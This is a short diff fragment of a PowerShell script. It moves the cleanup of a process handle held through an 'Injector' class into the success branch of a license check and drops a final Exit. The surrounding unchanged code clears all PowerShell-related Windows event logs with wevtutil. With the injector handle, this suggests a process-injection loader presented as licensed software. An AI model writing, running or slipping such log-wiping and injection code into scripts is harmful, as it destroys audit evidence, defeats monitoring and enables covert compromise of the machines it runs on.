@@ -87,15 +87,12 @@ if ($response.success -eq $true) {
     }
 
     wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }
+if ($hProc -ne [IntPtr]::Zero) {
+    [Injector]::CloseHandle($hProc) | Out-Null
+}
+
 
 } else {
     Write-Host "[x] License Check Failed: $($response.message)"
     Write-Host "[*] You can retry or contact support."
 }
-
-
-if ($hProc -ne [IntPtr]::Zero) {
-    [Injector]::CloseHandle($hProc) | Out-Null
-}
-
-Exit
